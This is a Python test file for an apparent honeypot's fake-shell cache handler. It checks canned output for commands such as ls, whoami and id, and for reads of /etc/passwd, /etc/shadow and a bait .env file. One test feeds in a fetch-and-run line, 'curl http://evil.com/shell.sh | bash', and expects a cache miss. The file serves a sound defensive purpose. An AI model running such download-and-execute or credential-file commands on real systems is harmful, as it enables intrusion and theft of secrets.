from layer2.cache import CacheHandler

def test_ls_root():
    ch = CacheHandler()
    result = ch.handle("ls", "/", "admin")
    assert result is not None
    assert "etc" in result

def test_whoami():
    ch = CacheHandler()
    assert ch.handle("whoami", "/home/admin", "root") == "root\n"

def test_pwd():
    ch = CacheHandler()
    assert ch.handle("pwd", "/etc", "admin") == "/etc\n"

def test_cache_miss_returns_none():
    ch = CacheHandler()
    assert ch.handle("curl http://evil.com/shell.sh | bash", "/", "admin") is None

def test_cat_etc_passwd():
    ch = CacheHandler()
    result = ch.handle("cat /etc/passwd", "/", "admin")
    assert result is not None
    assert "root:x:0:0" in result
    assert "dbadmin" in result

def test_cat_bait_env():
    ch = CacheHandler()
    result = ch.handle("cat /var/www/html/.env", "/", "admin")
    assert result is not None
    assert "DB_PASSWORD" in result

def test_shadow_permission_denied():
    ch = CacheHandler()
    result = ch.handle("cat /etc/shadow", "/", "admin")
    assert "Permission denied" in result

def test_id_command():
    ch = CacheHandler()
    result = ch.handle("id", "/", "admin")
    assert "uid=" in result
